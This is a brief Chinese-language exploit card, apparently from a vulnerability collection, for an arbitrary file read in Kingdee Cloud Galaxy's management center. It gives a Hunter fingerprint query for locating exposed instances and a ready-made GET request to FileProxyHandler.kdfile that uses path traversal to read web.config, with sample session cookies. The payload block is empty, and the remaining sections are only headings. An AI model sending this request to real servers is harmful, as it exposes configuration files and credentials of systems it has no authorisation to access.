# 金蝶云星空管理中心FileProxyHandler.kdfile任意文件读取漏洞

- **系统**：金蝶　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`hunter：`app.name="Kingdee 金蝶云星空"``
- **请求**：`GET /FileProxyHandler.kdfile?Area=0&F=..%2F..%2Fweb.config&Ope=SDL&Step=100000 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=rtanmcljbthsauvcfgff504m; Theme=standard; kdservice-sessionid=…`

**请求体 / payload**
```

```

**其他**
- 金蝶云星空管理中心FileProxyHandler.kdfile 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金蝶云星空-管理中心